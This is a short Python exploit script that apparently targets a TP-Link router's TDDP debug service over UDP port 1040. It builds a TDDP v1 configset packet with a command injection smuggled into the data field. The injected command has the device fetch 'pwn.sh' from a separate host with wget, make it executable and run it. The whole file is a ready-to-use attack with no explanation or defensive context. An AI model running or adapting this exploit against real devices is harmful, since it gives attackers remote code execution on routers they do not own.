#!/usr/bin/env python3

import hashlib
import socket
import logging

TARGET = "192.168.0.1"
PORT   = 1040

logging.basicConfig(level=logging.INFO)
log = logging.getLogger('tdp')

sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

TDDPCMD = {
  'tddp_cmd_spCmd': b'\x03',
  'sysinit': b'\x05', 
  'nil': b'\x00', 
  'ff': b'\xff',
  'tddpv1_sysinit': b'\x0c',
  'tddpv1_configset': b'\x31'
}

CMD = {
  'tddp_cmd_setOemID' :b'\x00\x00\x3c\x00', 
  'nil' :b'\x00\x00\x00\x00', 
  'tddp_cmd_setCountrycode' :b'\x00\x00\x43\x00'
}
 
def hash_and_send(p):
    if p[0] == '\x02':
        h = hashlib.md5(p[0:0x1c]).digest()
        pp = p[0:12]+h+p[28:]
    else:
        pp = p
    sock.sendto(pp, (TARGET, PORT))

def receive():
    resp,server = sock.recvfrom(4096)
    print(resp.hex())

def create_pkt_v1(tddpcmd, cmd='nil', data=b'', version=b'\x01', unknow_b=b'\x00\x00', enc=b'\x00\x00\x00\x00'):
    packet = version + TDDPCMD[tddpcmd] + unknow_b + enc + CMD[cmd] + data
    return packet

def configsetv1_inject():
    log.info("Preparing tddpv1_configset payload")
    p = create_pkt_v1('tddpv1_configset', data=b'AB||wget http://192.168.0.100:8000/pwn.sh && chmod +x pwn.sh && ./pwn.sh;A')
    log.info("Sending payload")
    hash_and_send(p)
    receive()

configsetv1_inject()
